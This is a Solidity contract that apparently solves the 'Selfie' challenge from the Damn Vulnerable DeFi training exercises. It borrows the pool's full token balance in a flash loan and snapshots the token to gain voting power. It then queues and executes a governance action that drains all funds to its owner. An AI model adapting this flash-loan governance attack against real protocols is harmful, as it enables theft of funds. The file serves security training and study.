pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

contract SelfieAttacker {
    SelfiePool pool;
    SimpleGovernance govern;
    DamnValuableTokenSnapshot token;
    address owner;

    uint256 actionId;

    constructor(address poolAddr, address governAddr, address tokenAddr) {
        pool = SelfiePool(poolAddr);
        govern = SimpleGovernance(governAddr);
        token = DamnValuableTokenSnapshot(tokenAddr);
        owner = msg.sender;
    }

    function receiveTokens(address _tokenAddr, uint256 amount) external {
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
            );
        token.snapshot();
        actionId = govern.queueAction(address(pool), data, 0);
        token.transfer(msg.sender, amount);
    }

    function hack1() external {
        pool.flashLoan(
            token.balanceOf(address(pool))
            );
    }

    function hack2() external {
        govern.executeAction(actionId);
    }
}
